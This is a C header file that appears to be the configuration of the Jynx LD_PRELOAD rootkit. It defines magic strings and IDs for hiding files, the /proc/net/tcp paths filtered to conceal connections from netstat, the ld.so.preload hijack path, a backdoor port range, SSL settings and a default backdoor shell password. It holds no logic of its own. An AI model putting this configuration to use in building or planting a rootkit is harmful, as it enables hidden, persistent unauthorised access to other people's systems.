#ifndef CONFIG_H
#define CONFIG_H

/* MAGIC_ strings used for hiding files */
#define MAGIC_STRING "XxJynx"
#define MAGIC_GID 7
#define MAGIC_UID 7

/* TCP files for hiding from netstat */
#define PROC_NET_TCP "/proc/net/tcp"
#define PROC_NET_TCP6 "/proc/net/tcp6"
#define CONFIG_FILE "ld.so.preload"

#define REALITY_PATH "/XxJynx/reality.so"

#define LOW_PORT 41
#define HIGH_PORT 43

/* SSL defines */
#define DEFAULT_KEY_BITS 1024
#define DEFAULT_CERT_DURATION 60 * 60 * 24 * 365
#define CERTIFICATE_COMMENT "auto"
#define DEFAULT_TCP_BUF_LEN  (1024 * 8)

/* PT initiation key */
#define SHELL_PASSWD "DEFAULT_PASS"

#define ENV_VARIABLE "XxJynx"

#define SHELL_MSG "Bump with shell.\n"

#define SHELL_NAME "XxJynx"

// comment out the next to lines if you are going to use autokit.sh
#define LIBC_PATH "/lib/libc.so.6" 
#endif
